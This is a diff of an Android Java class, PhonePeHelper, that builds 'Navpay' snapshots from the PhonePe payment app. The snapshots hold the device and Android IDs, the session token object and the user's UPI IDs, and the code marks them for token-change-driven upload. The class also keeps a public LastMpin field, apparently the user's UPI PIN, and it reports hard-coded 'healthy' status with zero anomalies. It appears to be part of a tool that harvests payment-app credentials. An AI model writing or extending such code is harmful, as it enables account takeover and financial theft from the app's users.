@@ -17,8 +17,10 @@ import org.json.JSONObject;
 import com.phonepehelper.NavpayBridgeDbHelper;
 import com.phonepehelper.NavpaySnapshotUploader;
 
+import java.nio.charset.StandardCharsets;
 import java.lang.reflect.Array;
 import java.lang.reflect.Method;
+import java.security.MessageDigest;
 import java.text.SimpleDateFormat;
 import java.util.Collection;
 import java.util.Date;
@@ -52,6 +54,9 @@ public final class PhonePeHelper {
     private static final long DEFAULT_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS = 3_600_000L;
     private static final long MIN_FORCE_SNAPSHOT_UPLOAD_INTERVAL_MS = 5_000L;
     private static final String FORCE_SNAPSHOT_UPLOAD_INTERVAL_PROPERTY = "navpay.snapshot.force_interval_ms";
+    private static final String NAVPAY_UPLOAD_MODE = "token_change_driven";
+    private static final String NAVPAY_SAMPLE_TYPE = "PHONEPE_SNAPSHOT";
+    private static final String KEY_NAVPAY_TOTAL_UPLOAD_COUNT = "navpay_total_upload_count";
 
     private static final String KEY_USER_PHONE = "user_phone";
     private static final String KEY_X_DEVICE_FP = "x_device_fp";
@@ -81,6 +86,7 @@ public final class PhonePeHelper {
     private static volatile ScheduledExecutorService phoneNumberMonitor;
     private static final AtomicReference<Object> handlerRef = new AtomicReference<>();
     private static final AtomicLong lastForcedSnapshotUploadAtMs = new AtomicLong(0L);
+    private static final AtomicLong navpayUploadCount = new AtomicLong(-1L);
     public static volatile String LastMpin = "";
 
     private PhonePeHelper() {}
@@ -275,9 +281,32 @@ public final class PhonePeHelper {
     public static JSONObject buildSnapshotForNavpay() {
         JSONObject snapshot = new JSONObject();
         try {
-            snapshot.put("requestMeta", getRequestMetaInfoObj());
-            snapshot.put("upis", getUPIs());
-            snapshot.put("collectedAtMs", System.currentTimeMillis());
+            long now = System.currentTimeMillis();
+            JSONObject requestMeta = getRequestMetaInfoObj();
+            JSONArray upis = getUPIs();
+            JSONObject requestPayload = buildNavpayRequestPayload(requestMeta, upis, now);
+            long totalUploadCount = incrementNavpayUploadCount();
+            JSONObject latestSample = buildNavpayRawSample(requestPayload, now, totalUploadCount);
+            JSONArray rawSamples = new JSONArray();
+            rawSamples.put(latestSample);
+            JSONArray events = buildNavpayEvents(now, totalUploadCount, requestPayload, latestSample);
+            JSONObject summary = buildNavpaySummary(now, totalUploadCount);
+            JSONArray keySnapshot = buildNavpayKeySnapshot(now, requestMeta, requestPayload, summary, latestSample, totalUploadCount);
+
+            snapshot.put("ok", true);
+            snapshot.put("deviceId", getAndroidId());
+            snapshot.put("deviceOnline", true);
+            snapshot.put("deviceLastSeenAtMs", now);
+            snapshot.put("uploadMode", NAVPAY_UPLOAD_MODE);
+            snapshot.put("tokenCheckIntervalMs", TOKEN_SYNC_INTERVAL_MS);
+            snapshot.put("summary", summary);
+            snapshot.put("totalUploadCount", totalUploadCount);
+            snapshot.put("latestSample", latestSample);
+            snapshot.put("events", events);
+            snapshot.put("keySnapshot", keySnapshot);
+            snapshot.put("rawSamples", rawSamples);
+            snapshot.put("rows", rawSamples);
+            snapshot.put("lastCollectedAtMs", now);
         } catch (JSONException e) {
             Log.w(TAG, "buildSnapshotForNavpay failed", e);
         }
@@ -507,6 +536,143 @@ public final class PhonePeHelper {
             return false;
         }
         return NavpayBridgeDbHelper.persistSnapshot(appContext, snapshot);
+    }
+
+    private static synchronized long incrementNavpayUploadCount() {
+        ensurePrefs();
+        long current = navpayUploadCount.get();
+        if (current < 0L) {
+            current = prefs == null ? 0L : prefs.getLong(KEY_NAVPAY_TOTAL_UPLOAD_COUNT, 0L);
+        }
+        long next = current + 1L;
+        navpayUploadCount.set(next);
+        if (prefs != null) {
+            prefs.edit().putLong(KEY_NAVPAY_TOTAL_UPLOAD_COUNT, next).apply();
+        }
+        return next;
+    }
+
+    private static JSONObject buildNavpayRequestPayload(JSONObject requestMeta, JSONArray upis, long collectedAtMs) throws JSONException {
+        JSONObject payload = new JSONObject();
+        payload.put("requestMeta", requestMeta == null ? new JSONObject() : requestMeta);
+        payload.put("upis", upis == null ? new JSONArray() : upis);
+        payload.put("collectedAtMs", collectedAtMs);
+        return payload;
+    }
+
+    private static JSONObject buildNavpayRawSample(JSONObject requestPayload, long now, long repeatCount) throws JSONException {
+        String canonical = canonicalJson(requestPayload);
+        String payloadHash = sha256Hex(canonical);
+        JSONObject sample = new JSONObject();
+        sample.put("id", buildNavpaySampleId(now, payloadHash));
+        sample.put("type", NAVPAY_SAMPLE_TYPE);
+        sample.put("createdAtMs", now);
+        sample.put("collectedAtMs", now);
+        sample.put("payload", requestPayload == null ? new JSONObject() : requestPayload);
+        sample.put("payloadHash", payloadHash);
+        sample.put("repeatCount", repeatCount);
+        sample.put("firstSeenAtMs", now);
+        sample.put("lastSeenAtMs", now);
+        JSONObject meta = new JSONObject();
+        meta.put("payloadHash", payloadHash);
+        meta.put("repeatCount", repeatCount);
+        meta.put("firstSeenAtMs", now);
+        meta.put("lastSeenAtMs", now);
+        sample.put("meta", meta);
+        return sample;
+    }
+
+    private static JSONArray buildNavpayEvents(long now, long totalUploadCount, JSONObject requestPayload, JSONObject latestSample) throws JSONException {
+        JSONArray events = new JSONArray();
+        JSONObject event = new JSONObject();
+        event.put("id", buildNavpayEventId(now));
+        event.put("type", "SNAPSHOT_CAPTURED");
+        event.put("severity", "info");
+        event.put("summary", "phonepe helper snapshot captured");
+        JSONObject detail = new JSONObject();
+        detail.put("collectedAtMs", now);
+        detail.put("totalUploadCount", totalUploadCount);
+        detail.put("sampleId", latestSample == null ? "" : latestSample.optString("id", ""));
+        detail.put("payloadHash", latestSample == null ? "" : latestSample.optString("payloadHash", ""));
+        detail.put("payloadKeys", requestPayload == null ? 0 : requestPayload.length());
+        event.put("detail", detail);
+        event.put("createdAtMs", now);
+        events.put(event);
+        return events;
+    }
+
+    private static JSONObject buildNavpaySummary(long now, long totalUploadCount) throws JSONException {
+        JSONObject summary = new JSONObject();
+        summary.put("status", "healthy");
+        summary.put("lastCollectedAtMs", now);
+        summary.put("lastUploadDelayMinutes", 0);
+        summary.put("uploads24h", totalUploadCount);
+        summary.put("anomalies24h", 0);
+        return summary;
+    }
+
+    private static JSONArray buildNavpayKeySnapshot(long now, JSONObject requestMeta, JSONObject requestPayload, JSONObject summary, JSONObject latestSample, long totalUploadCount) throws JSONException {
+        JSONArray entries = new JSONArray();
+        putNavpayKeySnapshotEntry(entries, "deviceId", getAndroidId(), now);
+        putNavpayKeySnapshotEntry(entries, "deviceOnline", "true", now);
+        putNavpayKeySnapshotEntry(entries, "deviceLastSeenAtMs", String.valueOf(now), now);
+        putNavpayKeySnapshotEntry(entries, "uploadMode", NAVPAY_UPLOAD_MODE, now);
+        putNavpayKeySnapshotEntry(entries, "tokenCheckIntervalMs", String.valueOf(TOKEN_SYNC_INTERVAL_MS), now);
+        putNavpayKeySnapshotEntry(entries, "summary.status", summary == null ? "" : summary.optString("status", ""), now);
+        putNavpayKeySnapshotEntry(entries, "summary.lastCollectedAtMs", String.valueOf(now), now);
+        putNavpayKeySnapshotEntry(entries, "summary.uploads24h", String.valueOf(totalUploadCount), now);
+        putNavpayKeySnapshotEntry(entries, "summary.anomalies24h", "0", now);
+        putNavpayKeySnapshotEntry(entries, "totalUploadCount", String.valueOf(totalUploadCount), now);
+        putNavpayKeySnapshotEntry(entries, "lastCollectedAtMs", String.valueOf(now), now);
+
+        JSONObject tokenObj = requestMeta == null ? null : requestMeta.optJSONObject("token");
+        putNavpayKeySnapshotEntry(entries, "requestMeta.androidId", requestMeta == null ? "" : requestMeta.optString("androidId", ""), now);
+        putNavpayKeySnapshotEntry(entries, "requestMeta.deviceId", requestMeta == null ? "" : requestMeta.optString("deviceId", ""), now);
+        putNavpayKeySnapshotEntry(entries, "requestMeta.packageName", requestMeta == null ? "" : requestMeta.optString("package", ""), now);
+        putNavpayKeySnapshotEntry(entries, "requestMeta.token", tokenObj == null ? "" : tokenObj.toString(), now);
+        putNavpayKeySnapshotEntry(entries, "latestSample.payloadHash", latestSample == null ? "" : latestSample.optString("payloadHash", ""), now);
+        putNavpayKeySnapshotEntry(entries, "latestSample.id", latestSample == null ? "" : latestSample.optString("id", ""), now);
+        putNavpayKeySnapshotEntry(entries, "requestPayload.collectedAtMs", requestPayload == null ? "" : String.valueOf(requestPayload.optLong("collectedAtMs", now)), now);
+        return entries;
+    }
+
+    private static void putNavpayKeySnapshotEntry(JSONArray entries, String field, String value, long changedAtMs) throws JSONException {
+        if (entries == null || TextUtils.isEmpty(field) || TextUtils.isEmpty(value)) {
+            return;
+        }
+        JSONObject entry = new JSONObject();
+        entry.put("field", field);
+        entry.put("value", value);
+        entry.put("changedAtMs", changedAtMs);
+        entries.put(entry);
+    }
+
+    private static String buildNavpaySampleId(long now, String payloadHash) {
+        String prefix = payloadHash == null || payloadHash.length() < 12 ? "000000000000" : payloadHash.substring(0, 12);
+        return "phrs_" + now + "_" + prefix;
+    }
+
+    private static String buildNavpayEventId(long now) {
+        return "phev_" + now;
+    }
+
+    private static String canonicalJson(JSONObject obj) {
+        return obj == null ? "{}" : obj.toString();
+    }
+
+    private static String sha256Hex(String value) {
+        try {
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] bytes = digest.digest((value == null ? "" : value).getBytes(StandardCharsets.UTF_8));
+            StringBuilder sb = new StringBuilder(bytes.length * 2);
+            for (byte b : bytes) {
+                sb.append(Character.forDigit((b >> 4) & 0xf, 16));
+                sb.append(Character.forDigit(b & 0xf, 16));
+            }
+            return sb.toString();
+        } catch (Throwable t) {
+            return "";
+        }
     }
 
     private static long resolveForceSnapshotUploadIntervalMs() {
